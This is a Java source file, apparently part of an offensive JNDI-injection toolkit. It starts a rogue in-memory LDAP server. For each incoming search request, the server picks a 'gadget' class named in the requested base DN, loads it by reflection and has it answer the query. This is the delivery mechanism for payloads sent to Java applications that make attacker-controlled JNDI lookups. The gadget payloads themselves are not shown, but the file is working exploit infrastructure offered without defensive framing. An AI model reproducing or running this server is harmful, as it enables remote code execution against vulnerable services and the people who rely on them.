package net.roboterh.injector.servers;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import net.roboterh.injector.enums.GadgetEnum;
import net.roboterh.injector.gadgets.LDAPService;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LdapServer {
    private static final Logger logger = LogManager.getLogger(LdapServer.class);

    private String ip;
    private int port;

    public static String ldapBase;

    public LdapServer(String ip, int port) {
        this.ip = ip;
        this.port = port;
    }

    public void startServer() {
        // build the ldap server
        try {
            InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            serverConfig.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName(ip),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));
            // add interceptor
            serverConfig.addInMemoryOperationInterceptor(new myOperationInterceptor());
            InMemoryDirectoryServer inMemoryDirectoryServer = new InMemoryDirectoryServer(serverConfig);
            inMemoryDirectoryServer.startListening();

            ldapBase = "ldap://" + ip + ":" + port + "/";

            // print the successful flag
            logger.info(String.format("LDAP server has been listening on %d ...", port));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    private class myOperationInterceptor extends InMemoryOperationInterceptor {
        // hand the SearchResult
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            // request getting
            String baseDN = result.getRequest().getBaseDN();
            logger.info(String.format("Receive the query %s ...", baseDN));

            // gadget selecting
            for (GadgetEnum gadgetEnum : GadgetEnum.values()) {
                if (gadgetEnum.name().equals(baseDN.substring(0, baseDN.indexOf("/")))) {
                    try {
                        Class<?> clazz = Class.forName("net.roboterh.injector.gadgets." + gadgetEnum.name());
                        LDAPService instance = (LDAPService) clazz.newInstance();
//                        Method sendResult = clazz.getMethod("sendResult");
//                        sendResult.invoke(instance, result, baseDN);
                        instance.sendResult(result, baseDN);

                        // break the cycle if gadget selected
                        break;
                    } catch (Exception e) {
                        logger.info(e.getMessage());
                    }
                }
            }
        }
    }
}
